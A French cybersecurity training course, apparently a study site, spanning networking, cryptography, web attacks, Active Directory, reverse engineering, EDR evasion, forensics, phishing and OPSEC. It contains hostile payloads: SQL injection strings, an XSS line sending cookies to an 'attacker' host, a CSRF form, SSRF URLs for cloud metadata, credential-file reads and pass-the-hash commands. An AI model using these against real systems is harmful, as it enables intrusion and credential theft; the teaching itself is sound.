Progression modules

00 — Démarrer ici

CyberLab est un parcours structuré pour apprendre la cybersécurité de zéro jusqu'à un niveau opérationnel : attaquer pour comprendre, défendre pour protéger. Chaque module empile sur le précédent. Les quiz et checklists sont sauvegardés dans ton navigateur (localStorage).

Comment utiliser ce site

  1. Lis le module dans l'ordre. Les notions se chevauchent.
  2. Fais tourner les commandes dans une VM — jamais sur ta machine hôte au début.
  3. Passe le quiz à la fin de chaque module. Score > 80% = tu peux avancer.
  4. Après le module 12, va casser des choses sur HackTheBox / TryHackMe.
Cadre légal. Tester un système sans autorisation écrite est un délit (art. 323-1 à 323-7 du Code pénal, FR / Computer Fraud and Abuse Act, US). Les techniques décrites ici s'exercent sur tes machines, des VM isolées, des plateformes qui autorisent l'intrusion (HTB, THM, portswigger, etc.), ou dans le cadre d'un contrat de pentest signé.

Setup labo recommandé

Hyperviseur

  • VirtualBox — gratuit, cross-platform
  • VMware Workstation Player — gratuit non-com
  • Proxmox — type-1, pour un vrai labo

VMs à préparer

  • Kali Linux ou Parrot OS — attaquant
  • Ubuntu Server — cible générique
  • Windows 10/11 Eval — cible AD
  • Metasploitable 2/3, DVWA, VulnHub — cibles vulnérables

Les trois questions qui structurent tout

  1. Qu'est-ce qu'on protège ? — données, service, réputation, vies.
  2. Contre qui ? — script-kiddie, criminel organisé, État, insider.
  3. Jusqu'où ? — budget, surface d'attaque acceptable, tolérance à l'incident.

Toute décision sécu redescend à ces trois. Un contrôle qui ne répond à aucune des trois est du théâtre.

Les concepts qu'on confond tout le temps

Vulnérabilité — un défaut (bug, erreur de config, humain naïf).

Menace — un acteur capable d'exploiter cette vulnérabilité.

Risque — probabilité × impact. Pas de risque sans les deux.

Exploit — l'arme concrète qui transforme la vulnérabilité en compromission.

Payload — ce qui s'exécute après l'exploit (shell, mineur, ransomware, implant).

AAA

  • Authentification — qui es-tu ? (quelque chose que tu sais / as / es)
  • Autorisation — qu'as-tu le droit de faire ?
  • Audit — qu'as-tu fait, et quand ?

Modèle d'attaque — kill chain Lockheed Martin

  1. Reconnaissance — collecter de l'info sur la cible
  2. Armement — préparer l'exploit + payload
  3. Livraison — mail, USB, drive-by, chaîne d'appro
  4. Exploitation — déclencher la vuln
  5. Installation — poser une persistance
  6. C2 — relier au serveur de commande
  7. Actions sur objectif — exfil, chiffrement, sabotage

MITRE ATT&CK

Catalogue vivant des tactiques (quoi) et techniques (comment) utilisées par les attaquants réels. 14 tactiques, des centaines de techniques. Référence à l'usage défenseur comme offenseur. À bookmarker : attack.mitre.org.

1. Un attaquant chiffre tes fichiers et demande une rançon. Quelle propriété CIA est principalement attaquée ?
Les fichiers chiffrés par ransomware restent présents mais inutilisables — c'est la disponibilité qui tombe. Si l'attaquant exfiltre aussi (double extorsion), la confidentialité tombe aussi, mais l'impact immédiat du chiffrement = indisponibilité.
2. Vulnérabilité × menace × impact. Qu'est-ce que ça donne ?
Risque = fonction de la probabilité (menace × vulnérabilité) et de l'impact. L'exploit est l'outil, la CVE est un identifiant.

Commandes essentielles

# navigation & inspection
pwd ; ls -la ; cd - ; file <f> ; stat <f>

find / -perm -4000 2>/dev/null       # SUID = pépite privesc

# process & réseau
ps auxf ; top ; htop

cat /etc/passwd ; sudo cat /etc/shadow
last ; w ; who

# package / service
systemctl status ssh
journalctl -u ssh -f

Permissions

# rwx = 4+2+1 ; triplet owner/group/other
chmod 750 script.sh       # owner=rwx, group=r-x, other=---
chown user:group f
# SUID (s au lieu de x) → s'exécute avec l'UID du propriétaire
# SGID / sticky bit (/tmp) → comportements particuliers
chmod u+s binaire         # SUID
Un binaire SUID root mal écrit = privesc instantanée. Vérifie toujours find / -perm -4000 en post-exploitation. GTFOBins (gtfobins.github.io) catalogue les abus connus.

Shell scripting — le minimum vital

#!/usr/bin/env bash
set -euo pipefail      # strict mode

TARGET="${1:-}"
[[ -z "$TARGET" ]] && { echo "usage: $0 <cible>"; exit 1; }

for port in 22 80 443 3306 5432; do
  if timeout 1 bash -c "</dev/tcp/$TARGET/$port" 2>/dev/null; then
    echo "[+] $TARGET:$port ouvert"
  fi
done

TCP vs UDP

TCP

  • Connecté — handshake 3-way (SYN → SYN/ACK → ACK)
  • Fiable — retransmission, ordre
  • Flags : SYN, ACK, FIN, RST, PSH, URG
  • Usage : HTTP, SSH, SMB

UDP

  • Pas de connexion, pas de garantie
  • Rapide, léger
  • Usage : DNS, DHCP, VoIP, QUIC (couche au-dessus)
  • Difficile à scanner (pas de réponse ≠ fermé)

Nmap — l'outil de reconnaissance

# découverte réseau — ping sweep
nmap -sn 192.168.1.0/24

# scan rapide TCP top-1000
nmap -sS -T4 10.10.10.5

# scan complet, versions, scripts par défaut, OS
sudo nmap -sS -sV -sC -O -p- --min-rate 2000 10.10.10.5 -oA full

# UDP top-100 (lent)
sudo nmap -sU --top-ports 100 10.10.10.5

# scripts NSE ciblés
nmap --script smb-enum-shares,smb-vuln-ms17-010 -p445 10.10.10.5
nmap --script http-enum,http-title -p80,443 10.10.10.5

# sortie dans tous les formats pour parsing
nmap ... -oA scan     # produit scan.nmap, scan.xml, scan.gnmap
-sS (SYN scan) ne complète pas le handshake — moins loggé. -sT (connect) complète, préféré sans root.

Wireshark / tcpdump

# capture ciblée

# rejouer / lire
tcpdump -r cap.pcap -A | less

# filtres wireshark fréquents
http.request.method == "POST"
tcp.flags.syn == 1 and tcp.flags.ack == 0
ip.addr == 10.10.10.5 and tcp.port in {80 443}

DNS — comprendre

dig example.com MX

Le handshake TCP est :
Trois étapes : client envoie SYN, serveur répond SYN+ACK, client confirme ACK. Après, la connexion est établie.
Port 445 ouvert sur une cible Windows, premier réflexe :
445 = SMB. smbclient -L, enum4linux-ng, nmap --script smb-*. MS17-010 (EternalBlue) à checker sur Win7/2008.

04 — Cryptographie

Les trois familles

Symétrique

Même clé pour chiffrer / déchiffrer. Rapide. Problème : partage de clé.

Exemples : AES (128/192/256), ChaCha20.

Modes : GCM (AEAD, à préférer), CBC, CTR. Jamais ECB — pattern visible.

Asymétrique

Paire clé publique / clé privée. Lent. Résout le partage.

Exemples : RSA, ECDSA, Ed25519, X25519.

Usage : échange de clé, signature.

Hash

Fonction à sens unique, taille fixe. Pas de clé.

Exemples : SHA-256, SHA-3, BLAKE2.

À éviter : MD5, SHA-1 (collisions prouvées).

Mots de passe : Argon2id, bcrypt, scrypt.

Pourquoi on mélange les deux

  1. Alice génère une clé AES aléatoire K.
  2. Elle chiffre son message avec K (AES-GCM).
  3. Elle chiffre K avec la clé publique RSA de Bob.
  4. Elle envoie les deux. Bob déchiffre K avec sa privée, puis le message avec K.

C'est l'idée de TLS, PGP, Signal. L'asymétrique transporte, le symétrique travaille.

TLS en 30 secondes

  1. Client → ClientHello (versions, ciphersuites, SNI, aléa)
  2. Serveur → ServerHello + certificat (chaîne X.509) + clé éphémère
  3. Échange ECDHE → secret partagé → dérivation de clés symétriques
  4. Trafic chiffré en AES-GCM / ChaCha20-Poly1305

Vérifs à faire sur un service : chaîne valide, versions ≥ TLS 1.2 (1.3 préféré), pas de ciphers faibles. Outil : testssl.sh.

PKI, en pratique

# voir le cert d'un service
openssl s_client -connect example.com:443 -servername example.com </dev/null \
  | openssl x509 -noout -text

# hash SHA-256 d'un fichier
sha256sum fichier.iso

# générer une paire ed25519 (SSH)
ssh-keygen -t ed25519 -C "poste-kali" -f ~/.ssh/id_ed25519

# chiffrer un fichier avec age (moderne, à préférer à gpg pour du simple)
age -r "age1..." fichier.txt > fichier.txt.age

Craquer des hashs — labo

# hashcat — GPU, format bien typé
hashcat -m 1000 hashes.txt rockyou.txt         # NTLM
hashcat -m 1800 hashes.txt rockyou.txt         # sha512crypt (Linux)
hashcat -m 22000 wifi.hc22000 rockyou.txt      # WPA/WPA2

# john the ripper — CPU, auto-détection
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
Un service te montre toujours le même ciphertext pour le même plaintext — même sur deux blocs identiques. Mode utilisé ?
ECB chiffre chaque bloc indépendamment, sans IV. Même entrée = même sortie. Image "Tux" ECB classique. GCM et CBC avec IV aléatoire produisent des ciphertexts différents.

05 — Sécurité web

Le web est la plus grande surface d'attaque du monde. L'OWASP Top 10 catalogue les classes de vulnérabilités les plus répandues. On va les voir en profondeur.

Modèle de requête HTTP

POST /login HTTP/1.1
Host: app.example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=hunter2

Comprendre chaque ligne (verbe, path, headers, body) est non-négociable. Burp Suite et curl seront tes outils.

OWASP Top 10 — par classe

A01 — Broken Access Control / IDOR

L'app vérifie que tu es connecté, mais pas que tu as le droit sur cette ressource.

GET /api/invoices/4821       → ta facture, OK
GET /api/invoices/4822       → la facture du voisin, aussi OK (BUG)

Mitigation : vérifier l'ownership côté serveur sur chaque requête. Jamais depuis le JWT côté client seul.

A02 — Cryptographic Failures

  • Mots de passe en clair ou MD5
  • HTTP au lieu de HTTPS sur du sensible
  • Clés en dur dans le code / git

A03 — Injection (SQLi, NoSQLi, cmd, LDAP)

Concaténer de l'input non-échappé dans un interpréteur. Pattern universel.

-- app vulnérable
query = "SELECT * FROM users WHERE name = '" + input + "'"

-- payload classique
input = admin' OR '1'='1' --

-- l'app exécute :
SELECT * FROM users WHERE name = 'admin' OR '1'='1' --'

Mitigation : requêtes paramétrées (prepared statements). Toujours. Les ORM font ça pour toi si tu ne contournes pas.

Union-based et blind SQLi

-- déterminer le nombre de colonnes
' ORDER BY 1-- ' ORDER BY 2-- ...

-- union pour extraire
' UNION SELECT null,username,password FROM users--

-- blind booléenne
' AND (SELECT substr(password,1,1) FROM users WHERE id=1)='a'--

-- time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--

sqlmap -u "https://cible/?id=1" --batch --dbs automatise. À utiliser après avoir compris à la main.

A04 — Insecure Design

Classe large : workflows mal pensés (reset de mdp par question secrète devinable, limites métier contournables, confiance côté client).

A05 — Security Misconfiguration

Headers absents, interfaces admin exposées, verbose errors, defaults non changés.

A06 — Vulnerable Components

Lib avec CVE connue (Log4Shell 2021). npm audit, pip-audit, trivy, dependabot.

A07 — Auth failures

  • Pas de rate-limit → brute force
  • User enum via messages d'erreur distincts
  • Sessions prédictibles / sans expiration
  • Pas de 2FA sur comptes sensibles

A08 — Software & data integrity failures

Updates non signés, désérialisation non contrôlée, pipelines CI/CD empoisonnés.

A09 — Logging & monitoring failures

Sans logs utiles, un incident reste invisible des mois. Médiane de détection post-breach : plus de 200 jours.

A10 — SSRF

L'app fait une requête vers une URL que tu contrôles — tu la fais pointer vers l'intérieur.

POST /fetch HTTP/1.1
url=http://169.254.169.254/latest/meta-data/     # metadata AWS
url=http://127.0.0.1:8500/v1/kv/?recurse         # Consul local
url=file:///etc/passwd                           # si schéma file autorisé

XSS — exécuter du JS chez autrui

Reflected

Payload dans la requête, re-rendu dans la réponse. URL partagée.

Stored

Payload persisté en DB (commentaire, profil). Touche tous les visiteurs.

DOM

JS côté client manipule une source dangereuse (location.hash) vers un sink (innerHTML).

<!-- payloads de test -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>fetch('//attacker/'+document.cookie)</script>

Mitigation : échapper selon le contexte (HTML, attribut, JS, URL, CSS). CSP stricte en défense en profondeur.

CSRF

Faire exécuter une action au visiteur sur un site où il est authentifié, sans son consentement.

<!-- hébergé sur evil.com, victime connectée à bank.com -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.getElementById('f').submit()</script>

Mitigation : SameSite=Lax/Strict sur cookies, CSRF tokens par formulaire, Origin/Referer check côté serveur sur actions sensibles.

Burp Suite — workflow

  1. Proxy configuré sur le navigateur (127.0.0.1:8080) + CA de Burp importée
  2. Browse le site → populate le Target → map le périmètre
  3. Envoie une requête intéressante vers Repeater → joue avec
  4. Intruder pour fuzzer un paramètre
  5. Decoder, Comparer, extensions (Autorize, JWT Editor)
Meilleure défense contre les injections SQL :
La blacklist se contourne (encodage, commentaires). Le WAF aide mais n'est pas une mitigation primaire. Les prepared statements séparent code et données au niveau du driver — l'input ne peut plus devenir du SQL.
Un cookie de session sans flag HttpOnly permet :
HttpOnly empêche l'accès JS au cookie. Sans ce flag, un XSS peut l'exfiltrer. L'interception réseau se mitige avec Secure + HTTPS. Le cross-domain se mitige avec SameSite.

06 — Systèmes & Active Directory

Windows essentials

ConceptDétail
SIDIdentifiant unique d'un principal (user, group, machine)

NTLMHash du mdp, authentification legacy, encore partout

Active Directory en 10 lignes

  • Forêt → domaine(s) → OU → objets (users, computers, groups, GPO)
  • Chaque machine jointe = compte machine (HOSTNAME$)
  • Auth par Kerberos : KDC (DC) distribue TGT puis TGS pour chaque service
  • Les SPN lient un service à un compte — pépite pour kerberoasting
  • Groupes clé : Domain Admins, Enterprise Admins, Account Operators
  • GPO = politiques appliquées aux objets

Attaques AD classiques

LLMNR / NBT-NS poisoning

Quand un host demande "qui est fileserv ?" en multicast, tu réponds. L'host t'envoie son hash NetNTLMv2 → craquage offline.

Outil : Responder -I eth0.

Mitigation : désactiver LLMNR et NBT-NS via GPO, forcer SMB signing.

Kerberoasting

Tout utilisateur authentifié peut demander un TGS pour n'importe quel SPN. Le ticket est chiffré avec le hash du compte de service → craquage offline si mdp faible.

# depuis Linux avec impacket
GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/user:pass
hashcat -m 13100 tickets.hash rockyou.txt

Mitigation : mots de passe longs sur comptes de service, MSAs/gMSAs.

AS-REP Roasting

Comptes avec "Do not require Kerberos preauth" → tu demandes un AS-REP sans fournir de crédentiel, le ticket contient de la data chiffrée avec le hash user. Offline crack.

GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

Pass-the-Hash

NTLM auth n'exige pas le mdp clair — le hash suffit. Vole le hash via LSASS/SAM, authentifie à distance.

crackmapexec smb 10.0.0.0/24 -u admin -H <ntlmhash>
impacket-psexec -hashes :<ntlmhash> admin@10.0.0.5

Pass-the-Ticket / Golden Ticket / Silver Ticket

Golden = TGT forgé avec le hash du compte krbtgt (nécessite compromission domaine). Persistance quasi-éternelle jusqu'au double rotate du krbtgt.

Silver = TGS forgé pour un service unique (nécessite hash du compte de service).

Privilege escalation local — Linux

  • Noyau — uname -a → searchsploit
  • Sudo mal configuré — sudo -l, cf. GTFOBins
  • SUID — find / -perm -4000
  • Capabilities — getcap -r / 2>/dev/null
  • Cron jobs écrivables, PATH relatif
  • Services écoutant en localhost
  • Automatiser : linpeas.sh, linux-smart-enumeration

Privilege escalation local — Windows

  • Services avec chemin non quoté + ACL faible
  • AlwaysInstallElevated → MSI SYSTEM
  • Jetons privilégiés (SeImpersonate → PrintSpoofer/JuicyPotato)
  • UAC bypass, DLL hijacking
  • Automatiser : winPEAS.exe, PowerUp.ps1, Seatbelt.exe
Tu craques un hash NetNTLMv2 obtenu via Responder. Hashcat mode ?
1000 = NTLM brut. 5600 = NetNTLMv2 (Responder). 13100 = Kerberos TGS (kerberoast).

07 — Reverse engineering

Comprendre un binaire sans son code source. Base de l'analyse malware, de la recherche de vulns, du cracking de protections.

Prérequis mentaux

  • Assembleur x86-64 (registres, pile, calling conventions)
  • Formats de binaires : PE (Windows), ELF (Linux), Mach-O (macOS)
  • Compilation : source → asm → objet → linked binary
  • Dynamique vs statique

x86-64 — minimum vital

RegistreRôle (Linux System V)
RAXValeur de retour
RDI, RSI, RDX, RCX, R8, R96 premiers arguments
RSPStack pointer
RBPBase pointer (optionnel)
RIPInstruction pointer

Windows x64 : args dans RCX, RDX, R8, R9 + shadow space 32 octets.

Outils

Statique

  • Ghidra — NSA, gratuit, décompile en pseudo-C
  • IDA Free/Pro — standard industrie
  • Binary Ninja
  • radare2 / rizin / cutter

Dynamique

  • x64dbg — Windows user-mode
  • WinDbg — Windows kernel + user
  • gdb + gef / pwndbg — Linux
  • Frida — hooking JS cross-plateforme

Triage

  • file, strings, binwalk
  • objdump -d, readelf, nm
  • Detect It Easy (DiE)
  • PE-bear, CFF Explorer

Workflow type sur un binaire inconnu

  1. file bin → architecture, type
  2. strings -n 8 bin | less → URLs, chemins, erreurs, debug
  3. readelf -a bin / PE-bear → sections, imports, entropy (chiffré ?)
  4. Charger dans Ghidra → identifier main / WinMain → remonter depuis les strings
  5. Renommer les fonctions / variables à mesure que tu comprends
  6. Si packed, dumper après unpacking en mémoire (x64dbg + Scylla)

Exemple — fonction à inverser

// code source d'origine (qu'on ne voit pas)
int check(char *s) {
    char key[] = "r3v3rs3";
    for (int i = 0; i < 7; i++) {
        if (s[i] != (key[i] ^ 0x5A)) return 0;
    }
    return 1;
}
; vue désassemblée (simplifiée)
check:
    xor     ecx, ecx                 ; i = 0
.loop:
    mov     al, [rdi+rcx]            ; s[i]
    mov     dl, [rip+key+rcx]        ; key[i]
    xor     dl, 0x5A
    cmp     al, dl
    jne     .fail
    inc     rcx
    cmp     rcx, 7
    jl      .loop
    mov     eax, 1
    ret
.fail:
    xor     eax, eax
    ret

On lit la constante 0x5A, les 7 octets de key, on XOR → on retrouve le mot de passe. C'est l'archétype de "trouve le flag".

Anti-RE qu'on rencontre

  • Packing — UPX (trivial), VMProtect, Themida (dur)
  • Anti-debug — IsDebuggerPresent, PEB check, int 3, timing
  • Anti-VM — artefacts VBoxGuest, MAC vendor, nb de CPU
  • Chiffrement de strings — déchiffrées en mémoire au besoin
  • Control-flow flattening, opaque predicates

Chaîne d'exécution typique

  1. Vecteur initial — phishing (macro Office, LNK, HTML smuggling, ISO), exploit, chaîne d'appro
  2. Loader minimal → télécharge ou décode le stage principal
  3. Évasion — anti-sandbox, anti-EDR
  4. Persistance — registre, tâche planifiée, service, startup
  5. C2 — HTTPS vers domaine fronting / CDN, DNS, SMB nommé
  6. Lateral movement — WMI, SMB, PsExec, RDP
  7. Objectif — exfil, chiffrement, destruction

EDR — ce qu'il voit

Un EDR moderne (CrowdStrike, Defender for Endpoint, SentinelOne, Elastic) hook en user-mode (ntdll inline hooks, ETW) et parfois en kernel (callbacks, mini-filter). Il regarde :

  • Création de process, parent anormal (ex. winword.exe → powershell.exe)
  • Chargement de DLL, side-loading
  • Appels sensibles : VirtualAllocEx, WriteProcessMemory, CreateRemoteThread → injection
  • Accès à LSASS
  • Traffic réseau anormal
  • ETW events (Threat Intelligence, kernel-process)

Techniques d'évasion (connaître pour détecter)

  • Unhooking ntdll — recharger la version propre depuis disque
  • Direct / indirect syscalls — contourner les hooks user-mode (HellsGate, SysWhispers)
  • ETW patching — EtwEventWrite ← ret
  • AMSI bypass — patch AmsiScanBuffer en mémoire
  • Sleep obfuscation — Ekko, Foliage : chiffrer le .text pendant les sleeps
  • Process hollowing / Early Bird / Module Stomping
  • LOLBAS / LOLBins — abuser des binaires signés légitimes (rundll32, mshta, certutil, wmic)

Analyse — labo d'un échantillon suspect

Isole, toujours. VM snapshot, pas de carte réseau partagée, pas d'accès aux dossiers hôte. Mieux : Flare-VM / REMnux, segment réseau avec INetSim pour simuler les services.
  1. Statique rapide — hash, VirusTotal (ou pas si opsec), strings, PE sections, imports, entropy
  2. Dynamique — Procmon (fichiers, registre), Procexp, Wireshark, Fakenet-NG
  3. Mémoire — snapshot RAM, volatility → process cachés, injections
  4. Comportement — persistance ? C2 ? objectifs ?
  5. IOC — hashs, domaines, mutex, chemins, règles Yara

Yara — exemple

rule Suspect_Loader_PowerShell {
    meta:
        author = "cyberlab"
        desc   = "PS loader with base64 + IEX"
    strings:
        $a = "FromBase64String" nocase
        $b = "IEX" nocase
        $c = "Invoke-Expression" nocase
        $d = /DownloadString\s*\(/ nocase
    condition:
        $a and ($b or $c) and $d
}

09 — Forensics / DFIR

Quand quelque chose s'est passé, et qu'on veut savoir quoi, comment, qui, et comment éviter que ça recommence.

Principes

  1. Ordre de volatilité — RAM > état réseau > process > disque > stockage distant > backups
  2. Chaîne de preuve — qui a touché quoi, quand, hash avant/après
  3. Travailler sur une copie — bit-à-bit (dd, FTK Imager), write-blocker si physique
  4. Documenter en continu — journal horodaté, screenshots, hashs

Acquisition

# image disque bit-à-bit, hash contrôlé
sudo dd if=/dev/sdb of=/mnt/evidence/disk.img bs=4M status=progress
sha256sum /mnt/evidence/disk.img > disk.img.sha256

# image mémoire Linux — LiME
sudo insmod lime.ko "path=/mnt/ev/mem.lime format=lime"

# mémoire Windows — WinPMem / DumpIt / Belkasoft RAM Capturer
winpmem.exe -o mem.raw

Analyse mémoire — Volatility 3

vol -f mem.raw windows.info
vol -f mem.raw windows.pslist
vol -f mem.raw windows.pstree
vol -f mem.raw windows.cmdline
vol -f mem.raw windows.netscan
vol -f mem.raw windows.malfind         # détecte injections
vol -f mem.raw windows.dumpfiles --pid 4820

Phishing — infra minimale (dans un cadre autorisé)

  • Domaine ressemblant, âgé, warm-up SMTP
  • DKIM/SPF/DMARC propres
  • GoPhish ou Evilginx2 (reverse-proxy, cookies + MFA)
  • Pretext aligné sur la cible (recrutement, facture, DRH)
  • Payload : LNK → PowerShell, ISO → LNK → JScript, HTML smuggling, OneNote
  • C2 : Mythic, Sliver, Cobalt Strike (commercial), Havoc

C2 — en quoi ça consiste

Un implant sur la cible rappelle périodiquement un serveur contrôlé par l'opérateur. Il reçoit des tâches, les exécute, renvoie des résultats. Les propriétés qu'on cherche :

  • Transport discret — HTTPS vers CDN, DNS over HTTPS, SMB nommé pour lateral
  • Jitter + sleep long — ne pas battre comme un métronome
  • Profils malléables — mimer un trafic légitime (ex. télémétrie Office)
  • Redirecteurs — plusieurs couches avant le vrai teamserver
  • Payload modulaire — chargé à la demande

Reporting — ce qui compte

  • Exec summary 1 page — risque business, pas technique

11 — OPSEC

Operational Security : ne pas se faire voir, ne pas se faire identifier, ne pas contaminer. Vaut autant pour le red teamer que pour le chercheur sous NDA.

Compartimentage

  • Une VM par persona / mission. Jamais mélanger.
  • Mail et identité dédiés par persona. Pas de réutilisation.
  • Snapshots avant chaque opération, rollback après.
  • Rien de personnel (clipboard, historique nav) sur la VM op.

Chaîne réseau

  • VPN de confiance → sortie Tor si anonymat réel requis
  • Pas de même VPN entre persona op et perso
  • DNS filtré, pas de leak IPv6 (whoer.net, ipleak.net pour vérifier)
  • User-agent, timezone, langue cohérents avec la persona

Logs et métadonnées

  • Vider métadonnées des fichiers (exiftool, mat2)
  • Scrubber les commentaires de code, chemins d'auteur
  • Pas de nom de domaine qui "signe" l'auteur (habitudes de nommage)
  • Vérifier les headers mail (X-Mailer, Message-ID) avant envoi

Côté personnel

  • Gestionnaire de mdp (Bitwarden, KeePassXC) + mdp uniques
  • MFA matériel (YubiKey) sur les comptes critiques
  • Chiffrement disque (LUKS, BitLocker, FileVault)
  • Backup 3-2-1 chiffré, testé
  • Signal pour comms sensibles, pas WhatsApp pour tout confondre
